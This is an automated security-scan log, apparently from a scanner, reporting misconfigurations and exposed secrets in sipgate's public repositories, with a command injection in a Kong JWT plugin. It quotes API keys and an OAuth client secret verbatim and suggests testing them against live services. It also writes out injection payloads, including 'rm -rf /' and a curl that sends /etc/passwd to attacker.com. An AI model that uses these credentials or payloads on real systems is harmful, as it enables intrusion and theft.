## REPOSCAN 2026-09-03 16:31:42 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-03 19:29:27 UTC
class: MISCONFIG
asset: clinq-bridge-sipgate/k8s/template/deployment.yml:23
confidence: 95
reasoning: The K8s deployment template hardcodes `REDIS_URL: rediss://10.37.248.211:6378` — an internal RFC-1918 IP address with a TLS-enabled Redis endpoint. This is in a public GitHub repo under the `sipgate` org, exposing internal infrastructure topology (private network IP, port, TLS config). The `cloudbuild.yaml` in the same repo reveals the GCP project ID (`clinq-services`) and cluster zone (`europe-west3`), cross-referencing this as a live production deployment target.
impact: HIGH — Exposes internal Redis endpoint; aids lateral movement or targeted SSRF if any internal-facing service is reachable from an attacker-controlled context.
verify_steps: 1) Confirm `10.37.248.211` resolves from any sipgate internal network. 2) Verify `rediss://` (TLS) vs `redis://` by checking if TLS termination is enforced. 3) Check if this IP is still assigned in GCP project `clinq-services` zone `europe-west3`.
class: SECRET
asset: radau/docker-compose.yml:13-20
confidence: 80
reasoning: `docker-compose.yml` contains hardcoded plaintext values: `API_KEY_MANAGEMENT=pYWVcrR4DmgCfkfmEte5nGNW`, `API_KEY_RADIUS=u39fNShDX6fAeXtWY6bZWY9x`, `DB_PASSWORD=wifi`, `POSTGRES_PASSWORD=wifi`. The README confirms `radau` is a live WPA Enterprise authentication microservice ("Radius Authentication micro-service used to provide wifi logins"). While these appear to be dev/example values (README shows empty key placeholders for production), they are committed to a public repo and could match deployed dev instances. The `API_KEY_MANAGEMENT` key is used in `api/token.go:19` to gate all user/token management endpoints.
impact: MEDIUM — If any dev/staging instance uses these default keys, the management API (user create/delete/token management) is fully exposed. The WPA Enterprise RADIUS backend would also be accessible.
verify_steps: 1) Check if any running radau instances accept these API keys via `Authorization` header against `/user` or `/token` endpoints. 2) Verify the GCP project `clinq-services` (from clinq-bridge-sipgate) doesn't also host radau. 3) Test if the keys authenticate against the OpenAPI spec at `/docs/openapi.yml`.
class: SECRET
asset: rest-api-examples/webapp-nodejs/.npmrc.dist:2-3
confidence: 60
reasoning: The `.npmrc.dist` file contains `client_id=2414245-0-e24e0091-8265-11e7-93e7-e5fb754b756f` and `client_secret=187812ce-b546-4fa9-96e8-771e9775c3cb`. These follow the sipgate OAuth client credential format and could be real (revoked or still-valid) credentials. The README instructs users to copy this file to `.npmrc` (which is gitignored), but the `.dist` template ships the exact credential format. The `index.js` uses these values directly against `api.sipgate.com` OAuth endpoints.
impact: LOW-MEDIUM — If the sipgate OAuth server has not revoked this specific client credential, it could be used to obtain access tokens via the authorization code flow. Even if revoked, it reveals the exact credential format and naming convention for sipgate OAuth clients.
verify_steps: 1) Attempt an OAuth token exchange using the client_id/client_secret against `https://api.sipgate.com/login/third-party/protocol/openid-connect/token`. 2) Check if the client is listed in sipgate's developer portal. 3) Verify `.gitignore` properly excludes `.npmrc` (confirmed: `.gitignore` contains `.npmrc`).
class: MISCONFIG
asset: radau/main.go:33-37
confidence: 85
reasoning: When the `CORS_ORIGINS` environment variable is not set (the default), `initCORSConfig()` sets `corsConfig.AllowAllOrigins = true` alongside `corsConfig.AllowCredentials = true`. This means any origin can make credentialed cross-origin requests to the RADIUS auth API. The `Authorization` header is also explicitly allowed. This permits any website to perform API operations on behalf of authenticated users (token management, user CRUD).
impact: MEDIUM — An attacker-controlled page can perform cross-origin requests with the user's API key/JWT, enabling account takeover or data exfiltration if a user visits a malicious link while authenticated.
verify_steps: 1) Confirm the default path (no `CORS_ORIGINS` env) is the production configuration. 2) Verify the `AllowAllOrigins + AllowCredentials` combination is actually exploitable by testing a cross-origin request from `evil.com`. 3) Check if a reverse proxy (nginx/HAProxy) strips or overrides CORS headers before they reach clients.
class: OTHER
asset: rest-api-examples/webapp-nodejs/index.js:30
confidence: 70
reasoning: The Express session middleware uses `secret: 'sipgate-rest-api-demo'` — a hardcoded, publicly known signing key. This key is committed to a public GitHub repo. While this is clearly example/demo code, it establishes a pattern that could be copy-pasted into production code.
impact: LOW — Session fixation risk if used in production. In an example repo, the impact is limited to demonstrating an insecure pattern.
verify_steps: 1) Verify no production instances copy this exact secret. 2) Check if the session secret is overridable via environment variable (it is not in the current code).
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-03 21:53:14 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-03 23:44:21 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-04 02:22:48 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-04 07:24:35 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-04 12:15:43 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-04 16:26:19 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-04 19:07:24 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-04 21:42:34 UTC
[HYP] Hardcoded API Keys in docker-compose.yml
class: SECRET
asset: sipgate/radau/docker-compose.yml:20-21
confidence: 95
reasoning: Two API keys committed in plaintext: `API_KEY_MANAGEMENT: pYWVcrR4DmgCfkfmEte5nGNW` and `API_KEY_RADIUS: u39fNShDX6fAeXtWY6bZWY9x`. These are used for basic auth on `/radius` routes. The repo is public and these keys are in git history permanently.
impact: high
verify_steps: Check if keys are still active by sending a request to the radau API with these credentials. If the service is deployed from this compose file, these are live production keys.
[HYP] Hardcoded Internal Redis IP in K8s Deployment
class: MISCONFIG
asset: sipgate/clinq-bridge-sipgate/k8s/template/deployment.yml:47
confidence: 90
reasoning: K8s deployment manifest hardcodes internal Redis endpoint `rediss://10.37.248.211:6378` (RFC1918 address). This exposes internal infrastructure details: GCP project `clinq-services`, zone `europe-west3`, and Redis on non-standard port 6378. The `rediss://` scheme indicates TLS but `rejectUnauthorized: false` is set in the Redis client code (clinq-bridge/src/cache/storage/redis-storage-adapter.ts:22).
impact: medium
verify_steps: Confirm `10.37.248.211:6378` is reachable from the internet or other cloud projects. Check if TLS verification is disabled in production.
[HYP] TLS Certificate Verification Disabled for Redis
class: MISCONFIG
asset: sipgate/clinq-bridge/src/cache/storage/redis-storage-adapter.ts:20-23
confidence: 85
reasoning: Redis client connects with `tls: { rejectUnauthorized: false }`, disabling TLS certificate verification. This allows MITM attacks on the Redis connection even when using `rediss://` (TLS) scheme.
impact: medium
verify_steps: Verify if the production deployment uses TLS and whether this setting is overridden via environment variables.
[HYP] Default Cookie Secret in PHP Framework
class: MISCONFIG
asset: sipgate/ansible-logger/ansible-logger-web/includes/Slim/Slim.php:307
confidence: 70
reasoning: Default cookie secret key set to `'CHANGE_ME'`. If deployed without changing this, session cookies can be forged by anyone who knows this default value.
impact: low
verify_steps: Check if ansible-logger is deployed in production and if the secret was changed from default.
[HYP] Example OAuth Client Secret in Distribution Config
class: SECRET
asset: sipgate/rest-api-examples/webapp-nodejs/.npmrc.dist:2-3
confidence: 60
reasoning: Contains `client_id=2414245-0-e24e0091-8265-11e7-93e7-e5fb754b756f` and `client_secret=187812ce-b546-4fa9-96e8-771e9775c3cb`. While this is a `.dist` file (template), it contains what appear to be real OAuth credentials, not placeholder values. The file is committed to a public repo.
impact: low
verify_steps: Test if these OAuth credentials are still valid against the sipgate API. Check if this is a demo/test client or production.
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-04 23:16:41 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-05 01:03:16 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-05 05:47:55 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-05 09:47:03 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-05 13:12:19 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-05 16:07:54 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-05 18:26:28 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-05 20:41:50 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-05 22:33:50 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-06 00:11:20 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-06 04:44:38 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-06 09:07:24 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-06 12:54:48 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-06 15:56:23 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-06 18:12:12 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-06 20:01:24 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-06 22:08:42 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-06 23:57:58 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-07 03:11:02 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-07 08:24:16 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-07 14:29:55 UTC
[HYP] Hardcoded Internal Redis Endpoint Across 15 CLINQ Bridge Repos
class: MISCONFIG
asset: sipgate/clinq-bridge-{sipgate,hubspot,salesforce,google,pipedrive,podio,zammad,zoho,freshsales,copper,agilecrm,1sales,outlook,pipeliner,moco}/k8s/template/deployment.yml
confidence: 95
reasoning: All 15 CLINQ bridge K8s deployment manifests hardcode the same internal Redis
impact: HIGH — Exposes internal Redis endpoint on private network. If any sipgate-adjacent service
verify_steps: 1) DNS/ICMP 10.37.248.211 from any internal network. 2) Verify GCP project
[HYP] TLS Certificate Verification Disabled for Redis in CLINQ Bridge
class: MISCONFIG
asset: sipgate/clinq-bridge/src/cache/storage/redis-storage-adapter.ts:13-15
confidence: 85
reasoning: The Redis client connects with `tls: { rejectUnauthorized: false }`, disabling TLS
impact: MEDIUM — Enables MITM on Redis connections despite TLS being configured. Cached contact
verify_steps: 1) Confirm the production deployment uses the rediss:// URL (it does). 2) Verify
[HYP] Hardcoded OAuth Client IDs Across Multiple CLINQ Bridge Deployments
class: SECRET
asset: sipgate/clinq-bridge-{hubspot,pipedrive,podio,zoho,salesforce}/k8s/template/deployment.yml
confidence: 90
reasoning: Multiple deployment manifests hardcode OAuth client IDs in plaintext:
impact: LOW-MEDIUM — Client IDs alone don't grant access (secrets are needed), but they reveal
verify_steps: 1) Check if these client IDs are registered in the respective OAuth provider
[HYP] Hardcoded API Keys and DB Credentials in Radau docker-compose.yml
class: SECRET
asset: sipgate/radau/docker-compose.yml:18-21
confidence: 95
reasoning: docker-compose.yml contains hardcoded plaintext credentials:
impact: MEDIUM — If any radau instance uses these default keys, the management API (user
verify_steps: 1) Send Authorization header with these keys to any radau /user or /token endpoint.
[HYP] Default CORS AllowAllOrigins + AllowCredentials in Radau
class: MISCONFIG
asset: sipgate/radau/main.go:16-17
confidence: 85
reasoning: When CORS_ORIGINS env var is not set (the default), initCORSConfig() sets
impact: MEDIUM — An attacker-controlled page can perform cross-origin requests with the user's
verify_steps: 1) Confirm the default path (no CORS_ORIGINS env) is the production configuration.
[HYP] Hardcoded OAuth Client Credentials in REST API Example
class: SECRET
asset: sipgate/rest-api-examples/webapp-nodejs/.npmrc.dist:2-3
confidence: 60
reasoning: Contains client_id=2414245-0-e24e0091-8265-11e7-93e7-e5fb754b756f and
impact: LOW — If the sipgate OAuth server has not revoked this client credential, it could be
verify_steps: 1) Attempt OAuth token exchange using these credentials against
[HYP] Hardcoded Session Secret in REST API Example
class: OTHER
asset: sipgate/rest-api-examples/webapp-nodejs/index.js:30
confidence: 70
reasoning: Express session middleware uses secret: 'sipgate-rest-api-demo' — a hardcoded,
impact: LOW — Session fixation risk if used in production. In an example repo, impact is
verify_steps: 1) Verify no production instances copy this exact secret.
[HYP] Default Cookie Secret in Ansible Logger
class: MISCONFIG
asset: sipgate/ansible-logger/ansible-logger-web/includes/Slim/Slim.php:307
confidence: 70
reasoning: Default cookie secret key set to 'CHANGE_ME'. If deployed without changing this,
impact: LOW — Session forgery if ansible-logger is deployed in production with default config.
verify_steps: 1) Check if ansible-logger is deployed in production. 2) Verify if the secret
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-07 18:50:57 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-07 21:54:55 UTC
[HYP] Hardcoded Internal Redis Endpoint (RFC-1918) Across 4 CLINQ Bridge Deployments
class: MISCONFIG
asset: sipgate/clinq-bridge-{sipgate,hubspot,google,pipedrive}/k8s/template/deployment.yml:46-49
confidence: 95
reasoning: All four deployment manifests hardcode `REDIS_URL: rediss://10.37.248.211:6378` as plaintext env var. This is an internal RFC-1918 IP with TLS-enabled Redis on non-standard port 6378. The GCP project `clinq-services` and cluster `clinq-services-cluster` in `europe-west3` are confirmed via `cloudbuild.yaml` in each repo. Exposed in public repos under the `sipgate` GitHub org.
impact: HIGH — Exposes internal Redis endpoint, GCP project ID, cluster zone, and private network topology. Aids lateral movement or targeted SSRF if any internal-facing service is reachable.
verify_steps: 1) Confirm `10.37.248.211` resolves from any sipgate GCP VPC. 2) Verify `rediss://` TLS termination. 3) Confirm GCP project `clinq-services` zone `europe-west3` still hosts this Redis.
[HYP] TLS Certificate Verification Disabled for Redis Connection
class: MISCONFIG
asset: sipgate/clinq-bridge/src/cache/storage/redis-storage-adapter.ts:22
confidence: 90
reasoning: Redis client connects with `tls: { rejectUnauthorized: false }`, disabling TLS certificate verification. This allows MITM attacks on the Redis connection even when using the `rediss://` (TLS) scheme configured in the K8s deployment manifests.
impact: MEDIUM — Enables man-in-the-middle on Redis connections despite TLS being configured. Cached contact data could be intercepted or tampered with.
verify_steps: 1) Confirm production deployment uses `rediss://` URL (it does per deployment.yml). 2) Verify whether this setting is overridden via environment variables in production.
[HYP] Hardcoded HubSpot OAuth Client ID in K8s Deployment
class: SECRET
asset: sipgate/clinq-bridge-hubspot/k8s/template/deployment.yml:50-51
confidence: 85
reasoning: `HUBSPOT_CLIENT_ID: 6bd4c77d-7d54-47fe-b637-6be96d8c3c05` is hardcoded in plaintext in the public K8s deployment manifest. While client IDs alone don't grant access (secrets are in K8s secrets), this reveals the exact HubSpot OAuth app registered for the CLINQ HubSpot bridge, including the callback URL `https://hubspot.bridge.clinq.com/oauth2/callback`.
impact: LOW-MEDIUM — Reveals registered OAuth client identity and callback URL. Combined with other findings, enables targeted phishing or OAuth misconfiguration attacks.
verify_steps: 1) Verify this client ID is registered in HubSpot's developer portal. 2) Check if the OAuth app has excessive scopes.
[HYP] Hardcoded Pipedrive OAuth Client ID in K8s Deployment
class: SECRET
asset: sipgate/clinq-bridge-pipedrive/k8s/template/deployment.yml:54-55
confidence: 85
reasoning: `CLIENT_ID: 36bc4ebf413cf06b` is hardcoded in plaintext in the public K8s deployment manifest. The `CLIENT_SECRET` is properly referenced from a K8s secret, but the client ID and OAuth identifier `PIPEDRIVE` are exposed.
impact: LOW — Reveals registered OAuth client identity. Combined with other findings, enables targeted attacks.
verify_steps: 1) Verify this client ID is registered in Pipedrive's developer portal.
[HYP] Hardcoded OAuth Client Credentials in REST API Example
class: SECRET
asset: sipgate/rest-api-examples/webapp-nodejs/.npmrc.dist:2-3
confidence: 65
reasoning: Contains `client_id=2414245-0-e24e0091-8265-11e7-93e7-e5fb754b756f` and `client_secret=187812ce-b546-4fa9-96e8-771e9775c3cb`. These follow the sipgate OAuth client credential format. The `.dist` template ships real-looking credentials (not placeholder values). The README instructs users to copy this file to `.npmrc` (gitignored), but the `.dist` is committed.
impact: LOW-MEDIUM — If the sipgate OAuth server hasn't revoked this specific client credential, it could be used to obtain access tokens via the authorization code flow. Even if revoked, it reveals the exact credential format.
verify_steps: 1) Attempt OAuth token exchange using these credentials against `https://api.sipgate.com/login/third-party/protocol/openid-connect/token`. 2) Check if the client is listed in sipgate's developer portal. 3) Verify `.gitignore` properly excludes `.npmrc`.
[HYP] Hardcoded Default Session Secret in REST API Example
class: OTHER
asset: sipgate/rest-api-examples/webapp-nodejs/index.js:30
confidence: 70
reasoning: Express session middleware uses `secret: 'sipgate-rest-api-demo'` — a hardcoded, publicly known signing key committed to a public repo. While this is example/demo code, it establishes a pattern that could be copy-pasted into production.
impact: LOW — Session fixation risk if used in production. In an example repo, impact is limited to demonstrating an insecure pattern.
verify_steps: 1) Verify no production instances copy this exact secret. 2) Check if the session secret is overridable via environment variable.
[HYP] Default Cookie Secret in Ansible Logger (Slim Framework)
class: MISCONFIG
asset: sipgate/ansible-logger/ansible-logger-web/includes/Slim/Slim.php:307
confidence: 70
reasoning: Default cookie secret key set to `'CHANGE_ME'`. If deployed without changing this, session cookies can be forged by anyone who knows this default value. Also, `cookies.secure` and `cookies.httponly` are both set to `false`.
impact: LOW — Session forgery if ansible-logger is deployed in production with default config.
verify_steps: 1) Check if ansible-logger is deployed in production. 2) Verify if the secret was changed from default.
[HYP] Default Database Credentials in Ansible Logger Config
class: SECRET
asset: sipgate/ansible-logger/ansible-logger-web/config/config.inc.php.dist:6
confidence: 65
reasoning: Contains `$config["db"]["password"] = "secret"` and `$config["db"]["user"] = "someuser"` as distribution defaults. While these are clearly placeholder values, they are committed to a public repo.
impact: LOW — Placeholder credentials unlikely to be used in production, but pattern encourages insecure defaults.
verify_steps: 1) Check if ansible-logger is deployed with these default credentials.
[HYP] Default Database Credentials in Ansible Logger Callback Config
class: SECRET
asset: sipgate/ansible-logger/ansible-callbacks/ansible-logger.conf.dist:3-4
confidence: 65
reasoning: Contains `password = somepassword` and `user = someuser` as distribution defaults for MySQL connection. Committed to public repo.
impact: LOW — Placeholder credentials, but pattern encourages insecure defaults.
verify_steps: 1) Check if any production ansible instances use these credentials.
[HYP] Hardcoded JWT Secret in AI Demo MCP Server Mock Service
class: SECRET
asset: sipgate/sipgate-ai-demo-auth-mcp-server/src/mock-service/server.ts:8
confidence: 75
reasoning: `JWT_SECRET = "mock-service-secret-key"` is hardcoded in the mock authentication service. This JWT secret is used to sign and verify tokens for the `/contracts` API. While this is a mock/demo service, the secret is committed to a public repo.
impact: LOW — Demo/mock service only, but if deployed alongside real services, could be used to forge JWT tokens.
verify_steps: 1) Check if the mock service is deployed in any environment. 2) Verify if the JWT_SECRET is overridable via environment variable.
[HYP] Public CORS with Credentials in CLINQ Bridge Express App
class: MISCONFIG
asset: sipgate/clinq-bridge/src/index.ts:17-20
confidence: 80
reasoning: CORS middleware configured with `credentials: true, origin: true` — this reflects any Origin header and allows credentials. Any origin can make credentialed cross-origin requests to the CLINQ bridge API, enabling potential account takeover or data exfiltration if a user visits a malicious link while authenticated.
impact: MEDIUM — An attacker-controlled page can perform cross-origin requests with the user's session/credentials.
verify_steps: 1) Confirm this default CORS config is used in production deployments. 2) Test a cross-origin request from `evil.com` with credentials. 3) Check if a reverse proxy strips or overrides CORS headers.
[HYP] Hardcoded Internal Dev URLs in sipgategcx Browser Extension
class: MISCONFIG
asset: sipgate/sipgategcx/manifest.json (permissions list)
confidence: 70
reasoning: The browser extension manifest exposes internal API endpoints including `http://api.dev.sipgate.net/RPC2` and `https://samurai.sipgate.net/RPC2` in its permissions list. This reveals internal hostnames and API paths that are not intended for public knowledge.
impact: LOW — Information disclosure of internal infrastructure; the dev endpoint is HTTP (not HTTPS).
verify_steps: 1) Verify if `api.dev.sipgate.net` and `samurai.sipgate.net` are accessible externally. 2) Check if the extension is still maintained.
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-07 23:53:30 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-08 02:29:08 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-08 07:30:30 UTC
[HYP] Command Injection in Kong JWT Firebase Plugin
class: OTHER
asset: kong-plugin-jwt-firebase/kong/plugins/jwt-firebase/handler.lua:30-37
confidence: 85
reasoning: The `grab_public_key_bykid()` function constructs a shell command using user-controlled `kid` (JWT key ID) value without sanitization. The `t_kid` parameter is directly interpolated into a `wget | grep | sed | openssl` pipeline via `io.popen()`. An attacker controlling the JWT header's `kid` field could inject arbitrary shell commands.
impact: HIGH - Remote Code Execution if the plugin processes untrusted JWT tokens
verify_steps: Review if the `kid` value from JWT headers is used directly in production; confirm the kong plugin configuration uses untrusted JWT sources
[HYP] Hardcoded Session Secret in Web Application
class: SECRET
asset: rest-api-examples/webapp-nodejs/index.js:35
confidence: 90
reasoning: Express session middleware is configured with a hardcoded secret `'sipgate-rest-api-demo'`. This allows session forgery if the application is deployed without changing the default secret.
impact: MEDIUM - Session hijacking in deployed web applications using this example code
verify_steps: Check if any sipgate production deployments use this example code pattern; verify the session secret is overridden via environment variables
[HYP] Hardcoded Internal Redis URL in Kubernetes Manifest
class: MISCONFIG
asset: clinq-bridge-sipgate/k8s/template/deployment.yml:38
confidence: 75
reasoning: The Kubernetes deployment template contains a hardcoded internal Redis URL `rediss://10.37.248.211:6378`. This exposes internal infrastructure IP addresses and assumes a specific Redis configuration.
impact: LOW - Information disclosure of internal infrastructure; potential for lateral movement if Redis is accessible
verify_steps: Verify if this IP is routable from outside the cluster; confirm Redis is not exposed publicly
[HYP] Example Credentials in Java API Client
class: SECRET
asset: sipgateapi-java-example/src/sipgateAPI/Client.java:25-26
confidence: 95
reasoning: The example Java client contains hardcoded placeholder credentials `username = "johndoe@example.org"` and `password = "password"`. While this appears to be example code, developers may copy this pattern to production.
impact: LOW - Example code demonstrates insecure credential handling pattern
verify_steps: Confirm this is only example code and not used in production; check for similar patterns in actual sipgate Java codebases
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-08 12:17:07 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-08 16:42:44 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-08 19:43:45 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-08 22:20:28 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-09 00:18:45 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-09 04:51:53 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-09 09:22:46 UTC
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-09 13:58:20 UTC
[HYP] OS Command Injection in Kong JWT Firebase Plugin via JWT `kid` Header
class: SSRF
asset: sipgate/kong-plugin-jwt-firebase/kong/plugins/jwt-firebase/handler.lua:31-34
confidence: 95
reasoning: grab_public_key_bykid(t_kid) concatenates the JWT header `kid` value directly into a shell command: local cmd = "wget -qO - " .. google_url .. " | grep -i " .. t_kid .. magic. A crafted JWT with a malicious kid (e.g. "; rm -rf / #") would execute arbitrary OS commands via io.popen(cmd). No sanitization or escaping is performed on t_kid before shell interpolation.
impact: CRITICAL — RCE on the Kong gateway node; attacker controls the full JWT header. Affects any Kong instance running this plugin.
verify_steps: 1) Deploy the plugin with a Firebase project_id. 2) Send a request with a JWT containing kid: "; curl attacker.com/exfil?data=$(cat /etc/passwd) #". 3) Observe outbound request to attacker.com or command execution.
[HYP] OS Command Injection in Kong JWT Firebase Plugin via Public Key Write
class: SSRF
asset: sipgate/kong-plugin-jwt-firebase/kong/plugins/jwt-firebase/handler.lua:47-50
confidence: 90
reasoning: push_public_key_into_file() constructs: echo -n " .. publickey .. " > " .. shm. The publickey variable originates from wget output of Google's x509 endpoint, filtered only by grep on kid. If grab_public_key_bykid returns output containing shell metacharacters (via a crafted kid that matches content in the JSON response), the echo command is vulnerable to injection. Additionally, line 48 has a typo: cmd_handlel:close() (should be cmd_handle), which causes a Lua runtime error, leaving the SHM file in an undefined state.
impact: HIGH — Secondary injection vector; the typo also means new keys are never properly saved, degrading the plugin's security posture.
verify_steps: 1) Trace the call path from do_authentication → grab_public_key_bykid → push_public_key_into_file. 2) Verify cmd_handlel typo causes Lua error. 3) Confirm the SHM write is never reached.
[HYP] Hardcoded Password in Example Environment Template
class: SECRET
asset: sipgate/rest-api-examples/new-voicemails-nodejs/.env.dist:3
confidence: 85
reasoning: The .env.dist template contains PASSWORD=87654321 — a concrete numeric password value, not a placeholder like CHANGE_ME or empty string. This is distributed as part of the example code and may be used as-is by users who copy the template without modification.
impact: LOW — Template file, not a live secret. However, users deploying this example may use the literal password for their sipgate accounts, creating credential reuse risk.
verify_steps: 1) Check if any sipgate API accounts use 87654321. 2) Verify .env is in .gitignore. 3) Check if the example README warns users to change credentials.
[HYP] Hardcoded MySQL Root Credentials in Default Config
class: SECRET
asset: sipgate/ansible-logger/ansible-callbacks/logger.py:26-27
asset: sipgate/ansible-logger/helpers/dbprep/dbprep.py:18-19
confidence: 80
reasoning: Both files define configDefaults with 'user': 'root', 'password': '' — an empty root password for MySQL. While these are config defaults overridden by ansible-logger.conf, the defaults ship in the source code and may be used if the config file is missing or misconfigured.
impact: LOW — Defaults only; requires ansible-logger.conf to be absent. But infrastructure tools with root MySQL defaults are a misconfiguration risk.
verify_steps: 1) Check if ansible-logger.conf is included in the repo or gitignored. 2) Verify the README instructs users to set a password. 3) Confirm the web frontend (index.php) uses the same config.
[HYP] Hardcoded HubSpot OAuth Client ID/Secret in .env.dist Template
class: SECRET
asset: sipgate/clinq-bridge-hubspot/.env.dist
confidence: 70
reasoning: The .env.dist file shows HUBSPOT_CLIENT_ID= and HUBSPOT_CLIENT_SECRET= as empty values, but the template structure confirms the app expects these credentials. The code in parse-environment.ts reads them from process.env without fallback. This is a low-risk finding as the values are empty, but the template documents the exact env vars an attacker would target.
impact: INFO — No hardcoded secret present; values are empty placeholders. However, the env var names and required fields are exposed.
verify_steps: 1) Confirm .env values are empty in the committed file. 2) Check if .env is in .gitignore. 3) Verify no other commit has leaked actual values.
[HYP] XSS / Header Injection via Unsanitized $_SERVER in SugarCRM Plugin
class: MISCONFIG
asset: sipgate/sipgate-sugarcrm/Files/custom/modules/sipgateio/sipgateio.php:58
asset: sipgate/sipgate-sugarcrm/Files/custom/modules/sipgateio/footer.php:21-24
confidence: 75
reasoning: sipgateio.php constructs a URL using $_SERVER['HTTP_HOST'] and $_SERVER['REQUEST_URI'] without sanitization: $url = 'http' . ... . '://' . "{$_SERVER['HTTP_HOST']}/{$_SERVER['REQUEST_URI']}"; This value is then echoed into XML Response attributes (onAnswer/onHangup). A crafted Host header or Request-URI containing XML metacharacters could break out of the attribute context. Similarly, footer.php uses $_SERVER values in HTML output via data-session and data-baseurl attributes without encoding.
impact: MEDIUM — Potential reflected XSS or XML injection if the SIP gateway passes unsanitized headers through to the browser. Requires a MITM or special header injection scenario.
verify_steps: 1) Send a request with Host: "<script>alert(1)</script>" to the SugarCRM endpoint. 2) Verify the output XML/HTML is not escaped. 3) Check if SugarCRM's output encoding mitigates this.
[HYP] Unauthenticated Socket.io Namespace Creation with User-Controlled Token
class: IDOR
asset: sipgate/demo.sipgate.io/server.js:40-42,53-54
confidence: 70
reasoning: req.query.token is used directly as a socket.io namespace name: io.of("/" + namespace). A user can connect to any namespace by guessing/brute-forcing tokens. The /connect route generates a random namespace via Math.random(), but the /success route trusts the user-supplied token parameter. No authentication check on namespace access.
impact: LOW — Demo app only. However, if this pattern is replicated in production code, it enables unauthorized access to real-time call event streams.
verify_steps: 1) Hit /success?token=demo123 and connect via socket.io to /demo123. 2) Verify no auth check on the namespace connection handler. 3) Check if Math.random() namespace is predictable.
[HYP] Insecure File Permission Guidance in Example Code
class: MISCONFIG
asset: sipgate/sipgate.io/examples/php/log_call-beginnings.php:13
asset: sipgate/sipgate.io/examples/php/log_call-beginning-answer-end.php:52
confidence: 60
reasoning: Comments explicitly instruct: "make sure this file is writeable (e.g. create the file and chmod 777 it)". Recommending chmod 777 on a log file that receives unsanitized $_POST data (fromNumber, toNumber, direction) creates a world-writable file that could be overwritten by any local user, potentially injecting call data or causing log injection.
impact: LOW — Example code only. But developers may copy this pattern to production.
verify_steps: 1) Check if any production code references these examples. 2) Verify the examples have a clear "DO NOT USE IN PRODUCTION" disclaimer.
[HYP] Potential SQL Injection via Unparameterized MySQL Query
class: MISCONFIG
asset: sipgate/ansible-logger/ansible-callbacks/logger.py:77
confidence: 55
reasoning: playbookLog() executes: cur.execute("INSERT INTO playbook_log (host_pattern, running, start) VALUES (%s,'1',NOW())", (hostPattern)). While this uses parameterized queries, the single-element tuple (hostPattern) is missing a trailing comma in Python, making it a string rather than a tuple. MySQLdb may interpret this incorrectly depending on the version. The pattern is used throughout the file correctly elsewhere (with proper tuples), but this specific instance has the Python tuple syntax error.
impact: LOW — MySQLdb typically still parameterizes the value correctly even with a string, but the code is technically incorrect and may behave unexpectedly.
verify_steps: 1) Test with a hostPattern containing SQL metacharacters. 2) Verify MySQLdb version handles string-vs-tuple correctly. 3) Check if the bug was fixed in later commits.
TARGET_ORG not configured for sipgate; skipping public-org deep scan.
## REPOSCAN 2026-09-09 17:28:25 UTC
